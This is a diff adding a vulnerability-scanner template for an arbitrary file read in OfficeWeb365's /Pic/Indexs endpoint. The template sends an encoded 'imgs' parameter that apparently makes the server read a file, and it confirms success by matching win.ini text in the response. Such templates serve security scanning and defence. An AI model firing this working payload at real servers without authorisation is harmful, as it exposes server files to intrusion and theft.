@@ -1,0 +1,35 @@
+id: OfficeWeb365_Pic_Indexs_fileread
+
+info:
+  name: OfficeWeb365_Pic_Indexs_fileread
+  author: MMY
+  severity: high
+  description: OfficeWeb365_Pic_Indexs_fileread
+  reference:
+    - 公众号网络安全透视镜
+  tags: OfficeWeb365
+
+http:
+  - raw:
+      - |+
+        GET /Pic/Indexs?imgs=DJwkiEm6KXJZ7aEiGyN4Cz83Kn1PLaKA09 HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+        DNT: 1
+        Connection: close
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 16-bit app support
+      - type: status
+        status:
+          - 200
+
